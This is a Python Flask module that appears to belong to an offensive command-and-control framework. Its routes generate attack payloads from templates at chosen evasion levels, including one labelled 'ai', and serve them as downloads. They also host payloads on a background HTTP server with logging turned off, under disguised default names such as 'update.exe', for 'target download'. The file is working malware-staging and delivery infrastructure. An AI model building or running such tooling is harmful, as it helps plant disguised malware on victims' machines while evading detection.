from flask import Blueprint, jsonify, request, send_file, Response, url_for
from managers import listener_mgr
from payload_factory import payload_factory
import logging
import os
import tempfile
import threading
import http.server
import socketserver

payload_bp = Blueprint('payloads', __name__)

# Temporary storage for hosted payloads
HOSTED_PAYLOADS = {}
hosting_server = None

@payload_bp.route('/api/payloads/templates')
def list_templates():
    """List all available payload templates."""
    try:
        templates = payload_factory.get_available_templates()
        return jsonify(templates)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@payload_bp.route('/api/payloads/generate', methods=['POST'])
def generate_payload():
    """Generate a custom payload."""
    data = request.json
    template_id = data.get('template_id')
    evasion_level = data.get('evasion', 'none') # none, weak, strong, ai
    options = data.get('options', {})

    if not template_id:
        return jsonify({"error": "Template ID required"}), 400

    try:
        payload_code = payload_factory.generate_payload(template_id, options, evasion_level)
        return jsonify({
            "status": "success",
            "code": payload_code,
            "evasion": evasion_level
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@payload_bp.route('/api/payloads/download', methods=['POST'])
def download_payload():
    """Generate and download as file."""
    data = request.json
    template_id = data.get('template_id')
    filename = data.get('filename', 'payload.txt')
    evasion_level = data.get('evasion', 'none')
    options = data.get('options', {})

    try:
        payload_code = payload_factory.generate_payload(template_id, options, evasion_level)

        # Create temp file
        fd, path = tempfile.mkstemp()
        with os.fdopen(fd, 'w') as tmp:
            tmp.write(payload_code)

        return send_file(path, as_attachment=True, download_name=filename)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

class PayloadHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Serve dynamic payloads from memory
        if self.path.lstrip('/') in HOSTED_PAYLOADS:
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            self.wfile.write(HOSTED_PAYLOADS[self.path.lstrip('/')].encode())
        else:
            self.send_error(404, "Payload not found")

    def log_message(self, format, *args):
        pass # Silence logs

def start_hosting_server(port=8000):
    global hosting_server
    try:
        handler = PayloadHandler
        hosting_server = socketserver.TCPServer(("", port), handler)
        logging.info(f"Payload Hosting Server started on port {port}")
        hosting_server.serve_forever()
    except Exception as e:
        logging.error(f"Failed to start hosting server: {e}")

# Start hosting server in background thread if not running
if not hosting_server:
    t = threading.Thread(target=start_hosting_server, daemon=True)
    t.start()

@payload_bp.route('/api/payloads/host', methods=['POST'])
def host_payload():
    """Host a generated payload for target download."""
    data = request.json
    template_id = data.get('template_id')
    filename = data.get('filename', 'update.exe')
    evasion_level = data.get('evasion', 'none')
    options = data.get('options', {})

    try:
        payload_code = payload_factory.generate_payload(template_id, options, evasion_level)
        HOSTED_PAYLOADS[filename] = payload_code

        # Determine LHOST
        # Try to find a public facing IP preferably
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # doesn't even have to be reachable
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'
        finally:
            s.close()

        download_url = f"http://{IP}:8000/{filename}"

        return jsonify({
            "status": "hosted",
            "url": download_url,
            "filename": filename
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500
